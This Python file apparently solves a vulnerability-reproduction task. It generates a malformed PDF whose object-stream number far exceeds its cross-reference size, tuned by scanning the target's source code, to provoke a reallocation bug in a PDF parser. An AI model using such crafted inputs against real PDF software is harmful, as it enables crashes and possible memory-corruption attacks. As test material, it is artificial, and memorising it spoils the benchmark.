import os
import re
from typing import Optional


def _int_to_be(n: int, width: int) -> bytes:
    return int(n).to_bytes(width, "big", signed=False)


def _xref_entry(t: int, f1: int, f2: int, w1: int = 4, w2: int = 2) -> bytes:
    return bytes([t & 0xFF]) + _int_to_be(f1, w1) + _int_to_be(f2, w2)


def _build_pdf(objstm_num: int = 50000) -> bytes:
    header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

    cat = b"<< /Type /Catalog /Pages 2 0 R >>\n"
    pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << >> >>\n"

    obj1 = cat
    obj2 = pages
    obj3 = page

    off2 = len(obj1)
    off3 = len(obj1) + len(obj2)
    objstm_header = f"1 0 2 {off2} 3 {off3}\n".encode("ascii")
    first = len(objstm_header)
    objstm_stream = objstm_header + obj1 + obj2 + obj3
    objstm_len = len(objstm_stream)

    parts = bytearray()
    parts += header

    # Object stream: objstm_num 0 obj
    offset_objstm = len(parts)
    parts += f"{objstm_num} 0 obj\n".encode("ascii")
    parts += f"<< /Type /ObjStm /N 3 /First {first} /Length {objstm_len} >>\n".encode("ascii")
    parts += b"stream\n"
    parts += objstm_stream
    parts += b"\nendstream\nendobj\n"

    # Contents stream: 4 0 obj
    offset_obj4 = len(parts)
    parts += b"4 0 obj\n<< /Length 0 >>\nstream\n\nendstream\nendobj\n"

    # Xref stream: 5 0 obj
    offset_obj5 = len(parts)

    # Xref stream data for objects 0..5 (Size = 6)
    # /W [1 4 2]
    # 0: free
    # 1,2,3: compressed in object stream objstm_num at indices 0,1,2
    # 4: uncompressed at offset_obj4
    # 5: uncompressed at offset_obj5
    xref_data = bytearray()
    xref_data += _xref_entry(0, 0, 65535)
    xref_data += _xref_entry(2, objstm_num, 0)
    xref_data += _xref_entry(2, objstm_num, 1)
    xref_data += _xref_entry(2, objstm_num, 2)
    xref_data += _xref_entry(1, offset_obj4, 0)
    xref_data += _xref_entry(1, offset_obj5, 0)

    xref_len = len(xref_data)

    parts += b"5 0 obj\n"
    parts += b"<< /Type /XRef /W [1 4 2] /Index [0 6] /Size 6 /Root 1 0 R "
    parts += f"/Length {xref_len} >>\n".encode("ascii")
    parts += b"stream\n"
    parts += xref_data
    parts += b"\nendstream\nendobj\n"

    parts += b"startxref\n"
    parts += f"{offset_obj5}\n".encode("ascii")
    parts += b"%%EOF\n"

    return bytes(parts)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Optionally adjust object stream number based on any MAX limit found in sources.
        # Keep within typical limits; default is 50000.
        objstm_num = 50000
        max_limit: Optional[int] = None

        try:
            # Fast heuristic scan of a few source files if present
            # for something like PDF_MAX_OBJECT_NUMBER or MAX_OBJECT_NUMBER.
            candidates = []
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if fn.endswith((".c", ".h", ".cc", ".cpp")):
                        candidates.append(os.path.join(root, fn))
                if len(candidates) >= 50:
                    break

            pat = re.compile(r"\b(?:PDF_MAX_OBJECT_NUMBER|MAX_OBJECT_NUMBER|PDF_MAX_OBJECTS)\b\s*(?:=)?\s*(\d+)")
            for p in candidates[:50]:
                try:
                    with open(p, "rb") as f:
                        data = f.read(200000)
                    m = pat.search(data.decode("latin1", errors="ignore"))
                    if m:
                        v = int(m.group(1))
                        if v > 1000:
                            max_limit = v
                            break
                except Exception:
                    continue
        except Exception:
            pass

        if max_limit is not None:
            # Ensure chosen number is below any explicit maximum.
            # Prefer a large gap over xref /Size to force realloc.
            if objstm_num >= max_limit:
                objstm_num = max(20000, min(max_limit - 1, 50000))
                if objstm_num < 1000:
                    objstm_num = 1000

        return _build_pdf(objstm_num=objstm_num)